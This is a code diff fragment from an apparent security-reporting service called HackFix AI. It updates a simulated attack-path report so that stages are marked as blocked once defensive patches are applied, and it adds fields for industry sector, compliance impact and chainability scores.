+        if applied_defenses:
+            app_lower = [d.lower() for d in applied_defenses]
+            for stg in stages:
+                bl_def = (stg.blockedByDefense or "").lower()
+                if any(ad in bl_def or bl_def in ad for ad in app_lower):
+                    stg.status = "blocked_by_patch"
+                    stg.narrative = f"🛡️ ATTACK PATH SEVERED: Defensive control '{stg.blockedByDefense}' applied. Adversary exploit is completely neutralized at this step."
+                    if severed_at is None:
+                        severed_at = stg.stepNumber
+                        severed_pct = max(25, int((len(stages) - stg.stepNumber + 1) / float(len(stages)) * 100))
+                elif severed_at is not None and stg.stepNumber > severed_at:
+                    stg.status = "blocked_by_patch"
+                    stg.narrative = "⚡ NEUTRALIZED: Previous defensive control severed the kill chain. Adversary cannot reach this stage."
 
         return AttackSimulationResponse(
             scanId=scan_id,
             targetUrl=target_url,
             riskLevel=risk_level,
-            executiveSummary=f"HackFix AI simulated a 4-stage adversary attack path against {target_url} based on the combination of {len(findings)} detected vulnerabilities. Without remediation, weaknesses on `{top_endpoint}` create high-probability threat vectors for customer session hijacking and compliance violations.",
+            industrySector=industry_sector,
+            complianceImpact=compliance_impact,
+            chainabilityScore=chain_score,
+            chainabilityVerdict=chain_verdict,
+            chainCatalysts=chain_catalysts,
+            severedAtStage=severed_at,
+            severancePercentage=severed_pct,
+            availableDefenses=available_defenses,
+            executiveSummary=f"HackFix AI simulated a 4-stage adversary attack path against {target_url} ({industry_sector}) based on {len(findings)} detected vulnerabilities. Weaknesses on `{top_endpoint}` create high-probability threat vectors for customer session hijacking and compliance penalties under {compliance_impact[0] if compliance_impact else 'data protection standards'}.",
             stages=stages,
-            boardroomTakeaway="Remediating the root-cause vulnerabilities using HackFix AI's verified patches severs the adversary kill chain and restores executive compliance."
+            boardroomTakeaway=f"Applying HackFix AI's defensive code patches severs the adversary kill chain at {top_title}, protecting {industry_sector} operations and fulfilling regulatory compliance."
         )
 
 gemini_service = GeminiService()
